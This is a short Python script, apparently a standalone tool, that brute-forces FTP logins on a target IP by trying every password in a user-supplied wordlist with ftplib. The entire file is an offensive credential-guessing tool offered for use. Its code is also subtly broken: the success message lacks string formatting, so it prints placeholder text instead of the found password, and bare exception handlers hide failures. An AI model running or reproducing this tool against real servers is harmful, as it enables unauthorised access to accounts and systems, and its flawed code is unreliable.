#import argparse
import sys
from ftplib import FTP
from pathlib import Path


#parser = argparse.ArgumentParser()
#parser.add_argument("-t", "--target")
#parser.add_argument("-u", "--username")
#parser.add_argument("-w", "--wordlist")

#args = parser.parse_args()

#user = args.username
#wordlist = args.wordlist
#target = args.target

def login(target, username, password):
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print ("\n Found!")
        print("Username: {username} \nPassword: {password}")
    except:
        pass

def bruteForce(target, username, wordlist):
    try:
        with wordlist.open("r") as f:
            words = f.readlines()
            for word in words:
                word = word.strip()
                login(target, username, word)
    except FileNotFoundError:
        print("\n There is no wordlist")
        sys.exit(0)

    except:
        print("\nAn error occured!")
        sys.exit(0)
        

target = input('Enter IP Target > ')
user = input('Enter Username > ')
wordlist = Path(input('Enter path to wordlist file > '))

bruteForce(target, user, wordlist)
print("\n[+] Brute Force Finished")


